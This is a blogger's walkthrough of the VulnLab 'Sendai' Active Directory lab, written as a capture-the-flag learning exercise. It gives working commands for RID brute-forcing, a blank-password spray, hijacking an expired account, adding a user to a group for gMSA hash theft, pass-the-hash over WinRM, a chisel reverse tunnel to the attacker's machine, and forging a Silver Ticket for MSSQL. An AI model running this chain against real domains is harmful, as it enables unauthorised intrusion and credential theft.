+++
date = '2026-11-08T17:21:00+01:00'
draft = false
title = 'Sendai Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`05/11/2026`**

![pwn.pmg](/images/imgs_sendai/pwn.png)

---
# Introduction

**_Sendai_** is a **Medium-level Active Directory** environment from **VulnLab** that provides a very realistic internal network exploitation path.

The initial foothold requires enumerating anonymous SMB shares to discover an internal IT policy regarding forced password changes. By performing a **RID brute-force** attack, we map out the domain users and identify accounts requiring a password reset upon next login.
After changing a user's password and gaining initial access, the path heavily relies on **BloodHound** to uncover a **`GenericAll`** privilege over an AD group, which in turn grants the right to read a **gMSA** (**Group Managed Service Account**) password.
Privilege Escalation involves finding hidden SQL configuration files, pivoting through a local **Chisel** proxy to reach an internally bound **MSSQL** instance, and ultimately forging a **Silver Ticket** to access the database as an **Administrator** and extract the **root flag**.

---

# Techniques Used

- **RID Brute-Forcing**

- **Forced Password Change Exploitation**

- **Active Directory ACL Abuse (GenericAll)**

- **Group Managed Service Account (gMSA) Abuse**

- **Network Pivoting & Port Forwarding (chisel)**

- **Silver Ticket Attack**

- **MSSQL Exploitation**

---

# Enumeration

## nmap

Initial full port scan:

```bash
nmap -p- sendai -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV sendai -Pn 
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-05 07:35:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
443/tcp  open  ssl/https?
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
```

I mapped the IP to **`sendai.vl`** and **`dc.sendai.vl`** in my **`/etc/hosts`** file:

## SMB Enumeration

Since this is an **Active Directory** environment, checking for **Anonymous SMB access** is always a priority.

```bash
nxc smb sendai.vl -u 'Guest' -p '' --shares
```

![smb.png](/images/imgs_sendai/smb.png)

I found accessible shares and connected using smbclient as Guest.

```bash
smbclient \\\\sendai.vl\\sendai -U 'Guest'
```

![mget.png](/images/imgs_sendai/mget.png)

Inside, I found a file named **`incident.txt`**. I downloaded it and read the contents:

```text
Dear valued employees,

We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.
...
```

This is a massive hint. Accounts with weak passwords have been expired, and users are forced to change them on their next login. If I can find out which users are affected, I might be able to change their password and hijack their account.

---

# Initial Access | Password Reset Exploitation

First, I needed a list of valid domain users. Since Guest access was allowed, I performed a **RID brute-force** attack via **NetExec**:

```bash
nxc smb sendai.vl -u 'Guest' -p '' --rid-brute
```

![ridbrute.png](/images/imgs_sendai/ridbrute.png)

I parsed the output to create a clean **`users.txt`** wordlist:

```bash
cat users.txt | cut -d '\' -f2 | awk '{print $1}' | tee users.txt
```

Next, I sprayed a blank password across all users to check their login status:

```bash
nxc smb sendai.vl -u users.txt -p '' --continue-on-success
```

![changepass.png](/images/imgs_sendai/changepass.png)

Two users required a password change. I used **Impacket**'s **`changepasswd.py`** to change **`elliot.yates`**'s password to something I control (**`Stars0@`**):

```bash
changepasswd.py sendai.vl/elliot.yates:@dc.sendai.vl -newpass 'Stars0@'
```

![changepass1.png](/images/imgs_sendai/changepass1.png)

---

# Lateral Movement | Domain Enumeration & gMSA Abuse

With a valid set of credentials, I ran the **Python BloodHound ingestor** to harvest all the domain information:

```bash
bloodhound-python -u 'elliot.yates' -p 'Stars0@' -d sendai.vl --zip -c All -dc dc.sendai.vl -ns 10.129.234.66
```

![harvest.png](/images/imgs_sendai/harvest.png)

Analyzing the data in **BloodHound**, I discovered that **`elliot.yates`** has **`GenericAll`** rights over the **`ADMSVC`** group.

![blood1.png](/images/imgs_sendai/blood1.png)

Furthermore, the **`ADMSVC`** group has **`ReadGMSAPassword`** rights over the **`MGTSVC$`** Group Managed Service Account.

![blood2.png](/images/imgs_sendai/blood2.png)

I used **bloodyad** to add **`elliot.yates`** into the **`ADMSVC`** group:

```bash
bloodyad --host 10.129.234.66 -d sendai.vl -u elliot.yates -p 'Stars0@' add groupMember 'ADMSVC' 'elliot.yates'
```

![addmem.png](/images/imgs_sendai/addmem.png)

Now that I was part of the group, I could dump the **gMSA** password for **`MGTSVC$`**:

```bash
nxc ldap sendai.vl -u elliot.yates -p stars0@ --gmsa
```

![gmsa.png](/images/imgs_sendai/gmsa.png)

This yielded the **NT hash** for **`MGTSVC$`**: **`88d544b552c4763c0333db7e48708a0d`**.

**Note**: _Since I am doing this box in 2026 on a fully updated system, **evil-winrm** initially failed with a **`CLIENT_TO_SERVER_SEALING`** error. This is a known incompatibility with **`Ruby/OpenSSL 3`** (where legacy **RC4** is disabled by default), not a bad credential issue. To quickly read the **user flag** while troubleshooting, I used **`nxc winrm`** to execute commands._

```bash
nxc winrm 10.129.234.66 -u 'mgtsvc$' -H '88d544b552c4763c0333db7e48708a0d' -x 'type C:\Users\mgtsvc$\Desktop\user.txt'
```

![userf.png](/images/imgs_sendai/userf.png)

---

# Privilege Escalation | Chisel Pivoting & Silver Ticket Attack

While enumerating **SMB shares** with my initial user, I had found a **`config`** share.

```bash
smbclient \\\\sendai.vl\\config -U elliot.yates
mget * 
cat .sqlconfig
```

![smb2.png](/images/imgs_sendai/smb2.png)

![sqlpass.png](/images/imgs_sendai/sqlpass.png)

I had credentials for **`sqlsvc`**, but port **`1433`** (**MSSQL**) wasn't exposed externally according to my **Nmap** scan. I needed an interactive session to pivot. This is exactly where I started to lose time, trying to find a way to remote into the machine.

Still don't know why ('cause that wasn't the first time I ran this command), but after running a simple **`sudo apt update && sudo apt full-upgrade`**, the **`OpenSSL/Ruby`** bug mysteriously resolved itself, allowing me to finally connect via **WinRM**:

```bash
evil-winrm -i sendai.vl -u 'mgtsvc$' -H "88d544b552c4763c0333db7e48708a0d" 
```

Once inside, I checked the listening ports:

```bash
netstat -ano | findstr :1433
```

![netstat.png](/images/imgs_sendai/netstat.png)

**MSSQL** was indeed bound to localhost. I uploaded **`chisel.exe`** to set up a reverse port forward to my attacking machine:

```bash
# On Kali
chisel server -p 8000 --reverse

# On Sendai (evil-winrm)
upload chisel.exe
.\chisel.exe client 10.10.14.79:8000 R:socks
```

![tunnel.png](/images/imgs_sendai/tunnel.png)

With the tunnel established, I could interact with the internal **MSSQL** instance using **proxychains**.However, I didn't just want standard access; I wanted full control. I generated the **NT Hash** for **`SurenessBlob85`** using an online converter, fetched the **domain SID** via **enum4linux**, and forged a **Silver Ticket** for the **Administrator** user:

```bash
# Get Domain SID
enum4linux sendai.vl | grep Sid
```

![sid.png](/images/imgs_sendai/sid.png)

```bash
# Forge the Silver Ticket
ticketer.py -spn MSSQL/dc.sendai.vl -domain-sid <dom-sid> -nthash <sqlsvc-hash> -dc-ip dc.sendai.vl -domain sendai.vl Administrator

# Export the cache
export KRB5CCNAME=Administrator.ccache
```

![ticketer.png](/images/imgs_sendai/ticketer.png)

Using **proxychains** and **`mssqlclient.py`** with **Kerberos** authentication (**`-k -no-pass`**), I connected to the database as the highly privileged impersonated **Administrator**.

```bash
proxychains mssqlclient.py dc.sendai.vl -k -no-pass
```

Since I had full rights, I used the **`OPENROWSET`** function to read the **root flag** directly from the file system:

```sql
SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents
```

---

# Final Thoughts

**_Sendai_** is a highly satisfying machine. The initial foothold requiring a password reset based on an internal IT memo is a refreshing and realistic scenario. Mapping the **GenericAll** to **ReadGMSAPassword** attack path with **BloodHound** reinforces core **Active Directory** abuse concepts. Finally, having to proxy traffic to reach an internal **MSSQL** instance and executing a **Silver Ticket attack** to read the **root flag** made for an excellent Privilege Escalation phase.

The **Ruby/OpenSSL 3** bug with **evil-winrm** was definitely a headache, but learning to fall back on **nxc winrm** to keep progressing is exactly why having a versatile toolkit is essential.